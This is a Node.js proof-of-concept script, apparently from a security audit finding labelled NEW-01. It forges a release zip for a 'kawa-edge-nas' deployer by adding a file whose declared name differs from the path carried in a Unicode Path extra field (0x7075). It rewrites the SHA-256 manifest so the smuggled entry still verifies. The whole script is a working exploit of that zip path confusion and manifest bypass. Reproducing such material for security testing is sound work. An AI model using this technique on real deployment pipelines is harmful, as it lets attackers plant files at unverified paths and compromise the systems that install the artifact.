// NEW-01 reproduction on the REAL R3.2 artifact. Usage: node repro.mjs <deployerRoot> <r3.2.zip> <out.zip> <effective path>
import fs from 'node:fs'; import path from 'node:path'; import zlib from 'node:zlib'; import crypto from 'node:crypto';
const [,, root, src, outZip, effective] = process.argv;
const { readZip } = await import(path.join(root, 'deployer/lib/zip.mjs'));
const entries = readZip(src);
const h = (b) => crypto.createHash('sha256').update(b).digest('hex');
const declared = 'kawa-edge-nas/docs/audit.txt', payload = Buffer.from('SECRET-TOKEN-PAYLOAD\n');
const man = entries.find(e => e.name.endsWith('/MANIFEST_SHA256_V1_3_1.json'));
const m = JSON.parse(man.data); m.files['docs/audit.txt'] = h(payload); m.file_count = Object.keys(m.files).length; man.data = Buffer.from(JSON.stringify(m, null, 2));
entries.push({ name: declared, data: payload, mode: 0o644 });
const locals = [], centrals = []; let off = 0;
for (const e of entries) {
  const name = Buffer.from(e.name), crc = zlib.crc32(e.data) >>> 0;
  let extra = Buffer.alloc(0);
  if (e.name === declared) { const u = Buffer.from(effective); extra = Buffer.alloc(9 + u.length); extra.writeUInt16LE(0x7075, 0); extra.writeUInt16LE(5 + u.length, 2); extra.writeUInt8(1, 4); extra.writeUInt32LE(zlib.crc32(name) >>> 0, 5); u.copy(extra, 9); }
  const l = Buffer.alloc(30); l.writeUInt32LE(0x04034b50, 0); l.writeUInt16LE(20, 4); l.writeUInt16LE(0, 6); l.writeUInt32LE(crc, 14); l.writeUInt32LE(e.data.length, 18); l.writeUInt32LE(e.data.length, 22); l.writeUInt16LE(name.length, 26); l.writeUInt16LE(extra.length, 28);
  const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(0x031e, 4); c.writeUInt16LE(20, 6); c.writeUInt16LE(0, 8); c.writeUInt32LE(crc, 16); c.writeUInt32LE(e.data.length, 20); c.writeUInt32LE(e.data.length, 24); c.writeUInt16LE(name.length, 28); c.writeUInt16LE(extra.length, 30); c.writeUInt32LE((((e.mode || 0o644) | 0o100000) << 16) >>> 0, 38); c.writeUInt32LE(off, 42);
  locals.push(l, name, extra, e.data); centrals.push(c, name, extra); off += 30 + name.length + extra.length + e.data.length;
}
const cd = Buffer.concat(centrals), end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
const zip = Buffer.concat([...locals, cd, end]);
fs.writeFileSync(outZip, zip);
fs.writeFileSync(outZip + '.sha256', `${h(zip)}  ${path.basename(outZip)}\n${h(man.data)}  kawa-edge-nas/MANIFEST_SHA256_V1_3_1.json\n`);
